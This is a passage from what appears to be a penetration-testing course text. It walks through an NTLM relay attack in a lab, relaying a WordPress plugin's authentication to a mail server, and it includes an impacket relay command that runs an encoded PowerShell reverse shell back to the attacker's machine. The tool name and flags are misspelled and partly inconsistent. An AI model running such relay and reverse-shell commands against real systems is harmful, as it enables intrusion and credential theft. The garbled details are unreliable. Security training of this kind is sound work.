Penetration Testing with Kali Linux

Migration WordPress plugin setting the destination to our Kali machine, we can use impacket-ntmlrelay¹1208 to relay the connection to MAILSVR1. If our assumptions are correct, the authentication request is made in the context of the local Administrator account on INTERNALSRV1, which has the same password as the local Administrator account on MAILSVR1.

If this attack successful, we'll obtain privileged code execution on MAILSVR1, which we can then leverage to extract the NTLM hash for beccy and further, one of the primary goals of the penetration test.

Since the second attack vector not only results in code execution on a single system, but also provides a potential vector to achieve one of the goals of the penetration test, we'll perform the relay attack first.

Let's set up impacket-ntmlrelay before modify the Backup directory in the WordPress plugin. We use -http-server and -sm2support to disable the HTTP server and enable SMB2 support. We'll specify the external address, address for MAILSVR1, 192.168.50.242, as target for the relay attack. By doing this we dont have to proxy our relay attack via Proxchains. Finally, we'll base64encode a PowerShell reverse shell online¹1209 that will connect to our Kali machine on port 9999 and for it to execute a command to:

```
kali@kali:~/$ sudo impacket-ntmlrelay -no-http-server -sm2support -t
192.168.50.242 -c "powershell -enc JBJgAwAsq..."

```
